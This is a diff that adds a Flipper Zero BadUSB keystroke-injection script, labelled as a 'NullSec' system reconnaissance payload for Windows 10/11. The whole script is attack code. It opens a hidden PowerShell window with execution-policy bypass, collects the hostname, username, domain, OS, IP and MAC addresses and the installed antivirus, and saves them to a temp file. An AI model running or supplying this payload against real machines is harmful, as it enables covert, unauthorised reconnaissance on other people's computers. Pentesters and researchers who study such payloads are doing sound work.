@@ -1,0 +1,31 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: System Reconnaissance
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+STRING $info = @{}
+ENTER
+STRING $info.Hostname = $env:COMPUTERNAME
+ENTER
+STRING $info.Username = $env:USERNAME
+ENTER
+STRING $info.Domain = $env:USERDOMAIN
+ENTER
+STRING $info.OS = (Get-WmiObject Win32_OperatingSystem).Caption
+ENTER
+STRING $info.IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
+ENTER
+STRING $info.MAC = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).MacAddress
+ENTER
+STRING $info.Antivirus = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct).displayName
+ENTER
+STRING $info | ConvertTo-Json | Out-File "$env:TEMP\sysinfo.json"
+ENTER
+STRING exit
+ENTER
